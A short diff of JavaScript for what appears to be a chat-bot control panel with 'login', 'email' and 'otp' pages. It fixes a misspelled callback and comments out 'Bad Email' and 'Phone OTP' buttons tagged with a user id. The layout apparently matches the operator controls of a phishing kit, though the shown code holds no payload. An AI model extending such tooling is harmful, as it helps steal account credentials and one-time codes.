@@ -644,7 +644,7 @@ if (page === "login" || page === "email" || page === "otp") {
   } else if (page === "email") {
     badButton = {
       text: "Bad Email",
-      callback_data: `cmd:bad-emaìl:${userId}`
+      callback_data: `cmd:bad-email:${userId}`
     };
   } else if (page === "otp") {
     badButton = {
@@ -653,13 +653,13 @@ if (page === "login" || page === "email" || page === "otp") {
     };
   }
 
-  buttons.push([
+/*  buttons.push([
     badButton,
     {
       text: "Phone OTP",
       callback_data: `cmd:phone-otp:${userId}`
     }
-  ]);
+  ]); */
 }
 
 
